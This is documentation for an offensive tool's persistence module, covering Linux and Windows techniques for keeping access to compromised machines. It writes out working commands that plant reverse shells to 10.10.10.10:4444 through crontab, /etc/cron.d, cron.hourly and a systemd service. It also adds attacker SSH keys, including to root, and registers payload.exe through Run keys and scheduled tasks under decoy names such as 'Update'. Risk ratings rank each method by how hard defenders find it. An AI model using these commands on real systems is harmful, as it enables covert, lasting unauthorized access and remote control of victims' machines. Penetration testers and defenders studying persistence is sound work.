# Persistence Mechanisms

Techniques for maintaining access to compromised systems.

## Quick Start

```bash
# List all mechanisms
rb exploit payload persist

# Linux cron persistence
rb exploit payload persist cron_persistence

# Windows registry persistence
rb exploit payload persist registry_run_key
```

## Command

### persist - Persistence Guide

Display persistence mechanisms and commands.

```bash
rb exploit payload persist [mechanism]
```

## Available Mechanisms

### Linux

| Mechanism | Risk Level | Command |
|-----------|------------|---------|
| Cron Job | MEDIUM | `rb exploit payload persist cron_persistence` |
| SSH Keys | LOW | `rb exploit payload persist ssh_key_persistence` |
| systemd Service | MEDIUM | `rb exploit payload persist systemd_service` |
| .bashrc | LOW | `rb exploit payload persist bashrc_persistence` |

### Windows

| Mechanism | Risk Level | Command |
|-----------|------------|---------|
| Registry Run Key | MEDIUM | `rb exploit payload persist registry_run_key` |
| Scheduled Task | MEDIUM | `rb exploit payload persist scheduled_task` |
| WMI Event | HIGH | `rb exploit payload persist wmi_persistence` |
| Sticky Keys | CRITICAL | `rb exploit payload persist sticky_keys` |

## Examples

### List All Mechanisms

```bash
rb exploit payload persist
```

### Specific Mechanism

```bash
# Linux cron
rb exploit payload persist cron_persistence

# Windows registry
rb exploit payload persist registry_run_key

# SSH keys
rb exploit payload persist ssh_key_persistence
```

## Mechanism Details

### Cron Persistence (Linux)

```bash
rb exploit payload persist cron_persistence
```

Output:

```
Cron Job Persistence (Linux)

1. User Crontab Persistence:
   (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -

2. System-wide Cron (/etc/crontab):
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" >> /etc/crontab

3. Cron Directory Drop (/etc/cron.d/):
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > /etc/cron.d/persistence

4. Hourly Cron Script:
   cat <<'EOF' > /etc/cron.hourly/update
   #!/bin/bash
   bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
   EOF
   chmod +x /etc/cron.hourly/update

Detection:
  - Defenders check: crontab -l, /etc/crontab, /etc/cron.d/*
  - Risk: MEDIUM

Cleanup:
  crontab -r
  rm /etc/cron.d/persistence
```

### SSH Key Persistence

```bash
rb exploit payload persist ssh_key_persistence
```

Output:

```
SSH Authorized Keys Persistence (Linux)

1. Add attacker's key:
   echo "ssh-rsa AAAA...attacker-key..." >> ~/.ssh/authorized_keys

2. Create new key pair on victim:
   ssh-keygen -t rsa -b 4096 -f /tmp/key -N ""
   cat /tmp/key.pub >> ~/.ssh/authorized_keys
   # Copy /tmp/key to attacker

3. System-wide authorized_keys:
   echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

Detection:
  - Requires checking authorized_keys files
  - Risk: LOW

Cleanup:
  Remove added lines from ~/.ssh/authorized_keys
```

### Registry Run Key (Windows)

```bash
rb exploit payload persist registry_run_key
```

Output:

```
Registry Run Key Persistence (Windows)

1. Current User (HKCU):
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Users\Public\payload.exe"

2. All Users (HKLM - requires admin):
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\System32\payload.exe"

3. PowerShell:
   Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\Users\Public\payload.exe"

4. RunOnce (runs once then deletes):
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Users\Public\payload.exe"

Detection:
  - Visible in: regedit, Autoruns, registry queries
  - Risk: MEDIUM

Cleanup:
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /f
```

### Scheduled Task (Windows)

```bash
rb exploit payload persist scheduled_task
```

Output:

```
Scheduled Task Persistence (Windows)

1. Create scheduled task (schtasks):
   schtasks /create /tn "Update" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru System

2. Create with specific time:
   schtasks /create /tn "Update" /tr "C:\Users\Public\payload.exe" /sc daily /st 09:00

3. PowerShell:
   $action = New-ScheduledTaskAction -Execute "C:\Users\Public\payload.exe"
   $trigger = New-ScheduledTaskTrigger -AtLogOn
   Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger

Detection:
  - Visible in: Task Scheduler, schtasks /query
  - Risk: MEDIUM

Cleanup:
  schtasks /delete /tn "Update" /f
```

### systemd Service (Linux)

```bash
rb exploit payload persist systemd_service
```

Output:

```
systemd Service Persistence (Linux)

1. Create service file:
   cat <<'EOF' > /etc/systemd/system/update.service
   [Unit]
   Description=System Update Service
   After=network.target

   [Service]
   Type=simple
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
   Restart=always
   RestartSec=60

   [Install]
   WantedBy=multi-user.target
   EOF

2. Enable and start:
   systemctl daemon-reload
   systemctl enable update.service
   systemctl start update.service

Detection:
  - Visible in: systemctl list-units, /etc/systemd/system/
  - Risk: MEDIUM

Cleanup:
  systemctl stop update.service
  systemctl disable update.service
  rm /etc/systemd/system/update.service
```

## Detection Risk Levels

| Risk | Description |
|------|-------------|
| LOW | Hard to detect, requires specific checks |
| MEDIUM | Visible in standard enumeration |
| HIGH | Advanced defenders will find it |
| CRITICAL | Easily detected, use only as last resort |

## Cleanup Importance

**ALWAYS clean up persistence after authorized testing:**

```bash
# Linux
crontab -r
rm /etc/cron.d/persistence
systemctl disable malicious.service
# Remove SSH keys added

# Windows
reg delete "HKCU\...\Run" /v "name" /f
schtasks /delete /tn "name" /f
```

## Next Steps

- [Privilege Escalation](/domains/exploit/01-privesc.md) - Find escalation vectors
- [Reverse Shells](/domains/exploit/02-shells.md) - Generate payloads
- [Lateral Movement](/domains/exploit/03-lateral.md) - Movement techniques
